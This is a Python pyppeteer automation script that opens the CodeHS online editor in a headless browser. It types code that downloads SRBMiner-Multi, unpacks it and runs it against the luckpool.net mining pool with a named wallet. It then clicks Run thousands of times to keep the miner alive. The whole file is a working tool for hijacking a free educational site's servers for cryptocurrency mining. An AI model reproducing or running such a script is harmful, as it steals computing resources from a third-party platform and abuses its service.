import asyncio
from pyppeteer import launch
import time
import sys

async def main():
    browser = await launch(options={'args': ['--no-sandbox'], 'devtools':True, 'headless':True})
    page = await browser.newPage()
    await page.goto('https://codehs.com')
    await page.click('#updated-navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(2) > button')
    time.sleep(5)
    #updated-navbar > ul.nav.navbar-nav.navbar-right > li:nth-child(2) > button
    await page.screenshot({'path': 'load.png'})
    await page.click('#write-code-modal > div > div > div > div > a:nth-child(3) > div')
    time.sleep(5)
    await page.waitForSelector('#ace-editor > div.ace_gutter > div')
    tabs = 15
    for x in range(tabs):
        time.sleep(0.5)
        await page.keyboard.press('Tab')
    time.sleep(0.5)
    await page.screenshot({'path': 'focus.png'})
    

    await page.keyboard.down('ControlLeft')
    await page.keyboard.press('KeyA')
    await page.keyboard.up('ControlLeft')
    await page.screenshot({'path': 'res.png'})
    time.sleep(1)
    await page.keyboard.type("import os; os.system('curl -L -o SRBMiner-Multi-0-9-3-Linux.tar.xz https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.IDSRB01 --password x')")
    
    await page.waitForSelector('#panels > div.__abacus_tab-container > div.__abacus_tab-content > div:nth-child(1) > div > div.__abacus_run-bar.__abacus_light-mode > button.StyledButtonKind-sc-1vhfpnt-0.eZfslY.__abacus_button.__abacus_runButton') # click run
     
    await page.click('#panels > div.__abacus_tab-container > div.__abacus_tab-content > div:nth-child(1) > div > div.__abacus_run-bar.__abacus_light-mode > button.StyledButtonKind-sc-1vhfpnt-0.eZfslY.__abacus_button.__abacus_runButton')
    
    await page.screenshot({'path': 'fin.png'})
    for x in range(30000):
    # for x in range(7):

        time.sleep(9)
        try:
            
             await page.click('#panels > div.__abacus_tab-container > div.__abacus_tab-content > div:nth-child(1) > div > div.__abacus_run-bar.__abacus_light-mode > button.StyledButtonKind-sc-1vhfpnt-0.eZfslY.__abacus_button.__abacus_runButton')
        except:
            await page.keyboard.press('s')
            await page.screenshot({'path': "aliive{n}.png".format(n=sys.argv[1])})
    
    await browser.close()
    


asyncio.get_event_loop().run_until_complete(main())
